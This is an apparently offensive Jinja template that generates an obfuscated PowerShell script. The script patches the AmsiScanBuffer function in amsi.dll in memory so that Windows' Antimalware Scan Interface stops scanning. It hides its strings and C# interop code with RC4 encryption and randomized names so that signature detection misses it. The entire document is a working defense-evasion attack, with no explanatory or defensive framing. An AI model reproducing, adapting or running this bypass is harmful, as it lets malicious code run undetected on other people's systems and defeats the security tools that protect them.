{% set winpatch = '''
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
''' %}

$Win32 = {{symbol_name("Decrypt-String")}} @"
{{winpatch|rc4encrypt}}
"@

Add-Type $Win32

{% set strings = [
    'amsi.dll',
    'AmsiScanBuffer',
] %}

{% for s in strings %}
    ${{symbol_name("rasta")}}string{{loop.index}} = {{symbol_name("Decrypt-String")}} "{{s|rc4encrypt}}"
{% endfor %}


$Address = [Win32]::GetProcAddress([Win32]::LoadLibrary(${{symbol_name("rasta")}}string1), ${{symbol_name("rasta")}}string2)
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)

